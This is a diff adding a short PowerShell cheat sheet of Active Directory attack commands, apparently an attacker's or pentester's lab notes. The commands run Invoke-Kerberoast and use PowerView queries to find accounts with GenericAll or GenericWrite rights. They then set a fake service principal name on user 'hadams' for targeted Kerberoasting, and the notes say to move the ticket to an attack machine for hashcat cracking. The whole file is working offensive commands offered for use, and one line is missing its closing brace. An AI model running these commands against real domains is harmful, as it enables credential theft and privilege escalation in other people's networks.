@@ -1,1 +1,27 @@
-test
+# dot source scripts
+. .\Invoke-Kerberoast.ps1
+
+# invoke kerberoast
+Invoke-Kerberoast
+
+#GenericAll
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+Get-ObjectAcl -SamAccountName hadams -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+# see if account has principal name
+Get-DomainUser -Identity hadams | select serviceprincipalname
+
+# set principal name for user
+Set-DomainObject -Identity hadams -Set @{serviceprincipalname='ops/whatever1'
+
+# dot source scripts
+. .\Invoke-Kerberoast.ps1
+
+# invoke kerberoast
+Invoke-Kerberoast
+
+# get ticket and copy. Join Lines & Find Replace spaces. Search for \s* reg ex and replace all with nothing
+# transfer to attack machine for hashcat
+
+#GenericWrite
+Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
